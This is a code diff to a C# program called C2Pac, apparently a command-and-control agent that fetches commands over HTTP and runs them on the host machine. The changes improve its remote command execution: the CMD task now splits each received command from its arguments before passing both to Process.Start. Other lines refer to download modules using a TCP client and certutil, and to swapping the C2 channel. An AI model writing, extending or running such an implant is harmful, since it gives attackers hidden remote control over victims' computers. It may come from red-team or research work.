@@ -21,6 +21,7 @@ public class C2Pac
     static char commandDelimiter = ':';
     static int retrieveInterval = 30000;
     static bool debugMode = false;
+    
     public static async Task Main(string[] args)
     {
         Console.WriteLine("[*] Starting C2 agent");
@@ -80,23 +81,6 @@ public class C2Pac
             Console.WriteLine($"Module Options: {moduleOptions}");
         }
 
-        // enhanced processing of command line arguments
-        /*if (moduleOptions.Contains(' '))    //  parse out the arguments for the command
-        {
-            string[] commandArgumentList = inputCommand.Split(delimiter);
-            if (commandArgumentList != null)
-            {
-                foreach (string argument in commandArgumentList)
-                {
-                    Console.WriteLine($"Processing argument: {argument}");
-                }
-            }
-        }
-        else
-        {
-            Console.WriteLine("No arguments provided.");
-        }*/
-
         return new C2Command
         {
             ModuleName = moduleName,
@@ -130,7 +114,7 @@ public class C2Pac
         {
             if (debugMode)
             {
-                Console.WriteLine("[*] Executing module: RCE");
+                Console.WriteLine("[*] Executing module: Exit");
             }
             ExitModule(inputValues.ModuleTask, inputValues.TaskOptions);
         }
@@ -150,7 +134,31 @@ public class C2Pac
             {
                 Console.WriteLine("Executing task: CMD");
             }
-            Process.Start(options);
+
+            // additional processing of command line arguments
+            if (options.Contains(' '))
+            {
+                int argumentsIndex = options.IndexOf(' ');
+                string commandValue = options.Substring(0, argumentsIndex);
+                string argumentsValue = options.Substring(argumentsIndex + 1);
+
+                if (argumentsValue != null)
+                {
+                    Process.Start(commandValue, argumentsValue);
+                }
+                else
+                {
+                    Process.Start(commandValue);
+                }
+            }
+            else
+            {
+                if (debugMode)
+                {
+                    Console.WriteLine("No arguments provided.");    
+                }
+                Process.Start(options);
+            }      
             return 0;
         }
         else
@@ -168,7 +176,6 @@ public class C2Pac
             {
                 Console.WriteLine("Initiating download using TCP client");
             }
-            //Process.Start(options);
             return 0;
         }
         else if (task == "certutil")
@@ -225,7 +232,7 @@ public class C2Pac
         }
     }
 
-    // this is where we swap out out C2 channel
+    // this is where we swap out the C2 channel
     public static async Task<string> RetrieveCommand()
     {
         string command = await RetrieveCommandFromHTTPGet();
